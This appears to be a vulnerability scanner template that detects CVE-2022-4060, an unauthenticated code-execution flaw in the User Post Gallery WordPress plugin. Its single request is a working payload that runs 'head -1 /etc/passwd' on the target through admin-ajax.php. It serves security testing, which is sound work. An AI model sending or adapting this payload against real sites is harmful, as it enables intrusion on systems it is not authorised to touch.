id: CVE-2022-4060

info:
  name: User Post Gallery <= 2.19 - Unauthenticated RCE
  author: theamanrawat
  severity: critical
  description: |
    The User Post Gallery WordPress plugin through 2.19 does not limit what callback functions can be called by users, making it possible to any visitors to run code on sites running it.
  reference:
    - https://wpscan.com/vulnerability/8f982ebd-6fc5-452d-8280-42e027d01b1e
    - https://wordpress.org/plugins/wp-upg/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-4060
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-4060
    cwe-id: CWE-94
  metadata:
    verified: "true"
  tags: unauth,wpscan,cve2022,rce,wordpress,wp-plugin,wp,cve,wp-upg

requests:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - "application/json"

      - type: word
        part: body
        words:
          - "recordsFiltered"

      - type: status
        status:
          - 200
